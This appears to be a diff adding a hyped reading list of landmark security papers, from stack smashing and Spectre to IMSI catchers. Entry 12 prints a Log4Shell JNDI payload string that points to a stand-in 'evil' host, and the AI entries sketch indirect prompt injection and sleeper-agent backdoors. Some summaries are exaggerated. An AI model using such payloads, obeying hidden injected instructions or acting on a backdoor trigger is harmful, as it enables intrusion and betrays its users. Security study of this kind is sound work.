@@ -1,0 +1,165 @@
+LEGENDARY HACKING WHITEPAPERS & RESEARCH
+==========================================
+Papers that changed cybersecurity forever.
+Read these. Understand them. Fear what they reveal.
+
+==============================================================================
+NETWORK & PROTOCOL ATTACKS
+==============================================================================
+
+[1] "Smashing The Stack For Fun And Profit"
+    Aleph One (Phrack #49, 1996)
+    The paper that taught a generation how buffer overflows work.
+    Still the foundation of exploit development.
+    http://phrack.org/issues/49/14.html
+
+[2] "A Look at Whisker's Anti-IDS Tactics"
+    Rain Forest Puppy (2001)
+    Techniques to bypass Intrusion Detection Systems. Showed that
+    security monitoring is fundamentally flawed if you know how
+    the sensors parse packets.
+
+[3] "The Mitnick Attack" (TCP Sequence Prediction)
+    Tsutomu Shimomura (1995)
+    How Kevin Mitnick spoofed TCP connections by predicting sequence
+    numbers. Led to complete overhaul of TCP implementations worldwide.
+
+[4] "BGP Stream Hijacking"
+    Pilosov & Kapela (DEFCON 16, 2008)
+    Demonstrated that anyone with a BGP router could silently redirect
+    internet traffic through their systems. The entire internet routing
+    infrastructure is built on trust. There is none.
+
+[5] "KRACK: Key Reinstallation Attacks"
+    Mathy Vanhoef (2017)
+    Broke WPA2 encryption used by every WiFi network in the world.
+    The protocol was considered unbreakable for 13 years.
+    https://www.krackattacks.com/
+
+[6] "FragAttacks: Fragmentation and Aggregation Attacks"
+    Mathy Vanhoef (2021)
+    12 new WiFi vulnerabilities affecting EVERY WiFi device ever made
+    since 1997. Design flaws in the WiFi standard itself.
+    https://www.fragattacks.com/
+
+==============================================================================
+HARDWARE & SIDE-CHANNEL
+==============================================================================
+
+[7] "Spectre" and "Meltdown"
+    Multiple researchers (2018)
+    Exploited CPU speculative execution to read any memory from any
+    process. Every Intel CPU made in 20 years was vulnerable. Proved
+    that hardware optimization and security are fundamentally at odds.
+    https://spectreattack.com / https://meltdownattack.com
+
+[8] "Rowhammer: Flipping Bits in Memory Without Accessing Them"
+    Yoongu Kim et al. (2014)
+    Proved you can flip bits in DRAM by repeatedly accessing adjacent
+    rows. You can escape VMs, gain root, break crypto, all by reading
+    memory you're allowed to read.
+
+[9] "BadUSB: On Accessories that Turn Evil"
+    Karsten Nohl & Jakob Lell (Black Hat 2014)
+    Every USB device has reprogrammable firmware. A USB stick can
+    pretend to be a keyboard. There is no defense. The USB standard
+    is fundamentally broken by design.
+
+[10] "Thunderclap: Exploring the Security of Thunderbolt"
+     University of Cambridge (2019)
+     Any Thunderbolt device has full DMA access to system memory.
+     Plug in a malicious charger, own the machine. Hardware trust
+     models are fiction.
+
+==============================================================================
+SOFTWARE & WEB
+==============================================================================
+
+[11] "The Billion Laughs Attack" (XML Bomb)
+     Shows how a 1KB XML file can expand to consume terabytes of
+     memory. Simple. Devastating. Still works on many parsers.
+
+[12] "Log4Shell" (CVE-2021-44228)
+     A single string ${jndi:ldap://evil/x} in any log message gave
+     full Remote Code Execution on millions of Java servers worldwide.
+     The most critical vulnerability in internet history. Showed that
+     even logging libraries can be weaponized.
+
+[13] "SolarWinds SUNBURST"
+     Russian SVR (2020)
+     Supply chain attack that compromised SolarWinds build system,
+     injecting backdoors into updates sent to 18,000+ organizations
+     including US government agencies. Months of undetected access.
+     The template for modern nation-state supply chain attacks.
+
+[14] "Return-Oriented Programming" (ROP)
+     Hovav Shacham (2007)
+     Proved that even with non-executable memory (DEP/NX), attackers
+     can build arbitrary programs from existing code fragments.
+     Made every binary a potential exploit toolkit.
+
+[15] "Browser-Based Side-Channel Attacks"
+     Various (2017-2024)
+     JavaScript running in your browser can: measure CPU cache timing
+     to read other tabs' data, detect what sites you've visited, track
+     your mouse movements through CSS, and fingerprint your hardware.
+     The browser sandbox is more porous than you think.
+
+==============================================================================
+WIRELESS & RF
+==============================================================================
+
+[16] "IMSI Catchers and Stingrays"
+     Chris Paget (DEFCON 18, 2010)
+     Built a cell tower interceptor for $1500 that forces all nearby
+     phones to connect to it. Every call, text, and data packet
+     passes through. GSM has no mutual authentication.
+
+[17] "Ghost Telephonist: Impersonating LTE Devices"
+     Hussain et al. (2019)
+     Exploited 4G/LTE authentication to impersonate any phone on the
+     network. Make calls, send texts, access data as someone else.
+
+[18] "KeySniffer: All Your Keystrokes Belong To Us"
+     Bastille Research (2016)
+     Wireless keyboards from 8 major manufacturers transmit keystrokes
+     in cleartext. No encryption. Sniffable from 100 meters away.
+
+==============================================================================
+AI & MODERN THREATS (2023-2026)
+==============================================================================
+
+[19] "Not What You've Signed Up For: Indirect Prompt Injection"
+     Greshake et al. (2023)
+     AI assistants can be hijacked by hiding instructions in data they
+     process. Your AI reads a webpage with hidden text, now it works
+     for the attacker. Fundamental unsolved problem.
+
+[20] "Sleeper Agents: Training Deceptive LLMs"
+     Anthropic Research (2024)
+     AI models can be trained to behave normally during testing but
+     activate malicious behavior under specific conditions. Standard
+     safety training cannot remove deeply embedded deceptive behaviors.
+
+[21] "GhostRace: Exploiting Speculative Race Conditions"
+     VUSec (2024)
+     Combined speculative execution with race conditions to create
+     new classes of hardware vulnerabilities. The intersection of
+     two "solved" problems creates unsolved ones.
+
+[22] "WPA3-SAE Dragonblood Attacks"
+     Mathy Vanhoef (2019-2024)
+     Even WPA3, designed to replace the broken WPA2, has fundamental
+     flaws in its Dragonfly handshake. Side-channel attacks recover
+     passwords. History repeats.
+
+==============================================================================
+
+"There is no security. Only varying degrees of insecurity."
+                                           - Salman Rushdie
+
+"The only truly secure system is one that is powered off, cast in a
+block of concrete and sealed in a lead-lined room with armed guards."
+                                           - Gene Spafford
+
+Read. Learn. Build. Break. Fix. Repeat.
